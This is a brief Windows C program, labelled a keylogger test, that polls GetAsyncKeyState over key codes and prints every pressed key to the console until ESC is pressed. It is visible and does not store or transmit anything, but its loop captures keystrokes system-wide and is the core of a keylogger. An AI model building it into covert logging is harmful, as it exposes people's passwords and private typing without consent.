#include <windows.h>
#include <stdio.h>

int main() {
    printf("Keylogger test running... Press ESC to stop.\n");
    while (1) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                printf("Key pressed: %d\n", key);
            }
        }
        if (GetAsyncKeyState(VK_ESCAPE)) {
            break;
        }
        Sleep(10);
    }
    return 0;
}